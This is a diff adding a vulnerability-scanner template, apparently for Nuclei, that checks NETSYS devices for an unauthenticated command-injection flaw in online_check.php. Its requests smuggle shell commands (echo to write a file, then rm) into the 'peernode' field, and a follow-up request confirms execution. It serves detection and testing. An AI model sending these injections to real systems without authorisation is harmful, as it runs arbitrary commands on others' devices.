@@ -1,0 +1,53 @@
+id: netsys-online_check-rce
+
+info:
+  name: Netsys online_check.php RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    A command execution vulnerability exists in NETSYS of Shenzhen Network Domain Technology Co., Ltd. An attacker could exploit the vulnerability to execute arbitrary system commands.
+  reference:
+    - http://www.netsys.cn/
+  classification:
+    cvss-metrics: "3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 9.8
+  tags: command-execution,rce
+
+http:
+  - id: create-test-file
+    method: POST
+    path:
+      - "{{BaseURL}}/view/vpn/autovpn/online_check.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "peernode=1;echo+sectest>/tmp/www/html/view/systemConfig/systemTool/ping/sectest+#"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-test-file
+    method: GET
+    path:
+      - "{{BaseURL}}/view/systemConfig/systemTool/ping/sectest"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "test"
+
+  - id: cleanup-test-file
+    method: POST
+    path:
+      - "{{BaseURL}}/view/vpn/autovpn/online_check.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "peernode=1;rm+/tmp/www/html/view/systemConfig/systemTool/ping/sectest+#"
+    matchers:
+      - type: status
+        status:
+          - 200
